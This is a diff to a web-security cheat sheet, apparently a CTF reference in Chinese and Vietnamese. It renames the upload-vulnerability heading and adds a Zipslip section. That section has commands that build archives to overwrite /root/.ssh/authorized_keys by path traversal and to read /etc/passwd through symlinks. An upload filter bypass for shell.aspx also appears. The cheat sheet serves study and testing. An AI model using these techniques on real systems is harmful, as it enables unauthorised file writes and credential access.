@@ -26,7 +26,7 @@ Table of Contents
     * [Postgresql](#postgresql)
     * [MS Access](#ms-access)
 *  [LFI](#lfi)
-*  [Upload](#上傳漏洞)
+*  [Upload](#Upload)
 *  [Serialization](#反序列化)
     * [PHP Serialize](#php---serialize--unserialize)
     * [Python Pickle](#python-pickle)
@@ -2244,7 +2244,7 @@ HQL injection example (pwn2win 2017)
     - [HITCON CTF 2018 - Why so Serials?](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
     - [Hack.lu 2019 - Trees For Future](https://w0y.at/writeup/2019/10/28/hacklu-2019-trees-for-future.html)
 
-# 上傳漏洞
+# Upload
 
 ## Javascript檢測
 
@@ -2352,6 +2352,25 @@ HQL injection example (pwn2win 2017)
 - .NET (context.Request.files)
     - 抓上傳檔名只匹配 `Content-Disposition:` 後的 `filename=xxx`
     - `Content-Disposition:name="file"kaibrokaibrofilename=shell.aspx`
+
+## Zipslip
+
+- Đối với những web giải nén file thì thử symlink
+  - Thử với symlink 1 file:
+
+    ```
+    touch ../../root/.ssh/authorized_keys
+    zip evil-slip ../../root/.ssh/authorized_keys
+    unzip -l evil-slip
+    ```
+
+  - Thử thêm với Double symlink:
+ 
+    ```
+    ln -s /some/readable/directory/ dirlink
+    ln -s /etc/passwd dirlink/passwd.txt
+    zip -y evil-link-dir-file dirlink dirlink/passwd.txt
+    ```
 
 ## 其他
 
